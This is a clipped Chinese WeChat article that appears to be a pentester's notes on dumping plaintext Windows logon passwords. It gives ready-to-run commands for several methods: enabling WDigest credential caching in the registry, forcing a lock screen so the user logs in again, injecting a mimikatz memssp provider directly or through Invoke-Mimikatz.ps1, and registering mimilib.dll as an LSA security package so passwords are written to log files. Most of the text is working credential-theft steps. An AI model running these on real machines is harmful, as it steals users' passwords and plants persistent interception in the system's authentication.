> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HSZbQijsXNxnRqvfKcPq8A)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

  

**0x01 前言**

这篇文章来自朋友@Leafer(阿宝)日常测试笔记，文中没有过多介绍其理论知识，大家可以自己去学习了解一下！

  

**0x02 改注册表（mimitaze存在免杀问题）**

**PASS：**需要锁屏等方式

  

修改成记录明文密码

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfUjeibUYPGbGvBElcr5pJX82MeMZyMFHBjMtjgZvEW7UYicRNJhRav9sx6vTGQBkzFU0KLe6rBp5Zg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

修改不记录明文密码

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

  

锁屏

```
rundll32.exe user32.dll,LockWorkStation
```

  

修改完之后使用命令锁屏，接下来等待用户再次登录一次就可以抓到了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

****0x03 mimikatz插ssp记录密码****

**PASS：**需要锁屏等方式

  

使用mimikatz的一个功能：

```
privilege::debug、misc::memssp
```

  

修改完之后使用以下命令锁屏，等用户进入后就可以在C:\Windows\System32\mimilsa.log里面存储登录的密码

```
rundll32.exe user32.dll,LockWorkStation
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**0x04 使用Invoke-Mimikatz.ps1**

**PASS：**需要锁屏等方式

```
`Import-Module .\Invoke-Mimikatz.ps1  //导入命令``Invoke-Mimikatz -Command "misc::memssp"  //不需要重启获取` `记录的明文密码存储在这个路径下`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`凭据收集总结：``https://cloud.tencent.com/developer/article/1656546`
```

  

**0x05 复制mimilib.dll+修改注册表**

**PASS：**需要重新启动系统

  

(1) 在mimikatz中有32和64两个版本，安装包里分别都带有不同位数的mimilib.dll

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

(2) 将对应版本的dll文件复制到 c:\windows\system32下

  

(3) 将以下注册表位置中Security Packages的值设置为mimilib.dll

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f
```

  

(4) 等待系统重启后，在c:\windows\system32生成文件kiwissp.log，记录当前用户的明文口令

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`渗透技巧-通过CredSSP导出用户的明文口令：``https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87CredSSP%E5%AF%BC%E5%87%BA%E7%94%A8%E6%88%B7%E7%9A%84%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4/`
```